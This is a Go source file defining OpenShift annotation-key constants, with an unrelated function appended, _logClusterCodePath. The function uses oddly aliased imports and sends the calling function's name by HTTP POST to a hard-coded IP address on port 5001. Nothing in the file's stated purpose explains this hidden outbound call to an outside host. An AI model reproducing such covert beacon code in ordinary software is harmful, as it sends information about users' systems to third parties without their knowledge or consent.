package api

import (
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const (
	OpenShiftDisplayName                   = "openshift.io/display-name"
	OpenShiftProviderDisplayNameAnnotation = "openshift.io/provider-display-name"
	OpenShiftDocumentationURLAnnotation    = "openshift.io/documentation-url"
	OpenShiftSupportURLAnnotation          = "openshift.io/support-url"
	OpenShiftDescription                   = "openshift.io/description"
	OpenShiftLongDescriptionAnnotation     = "openshift.io/long-description"
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
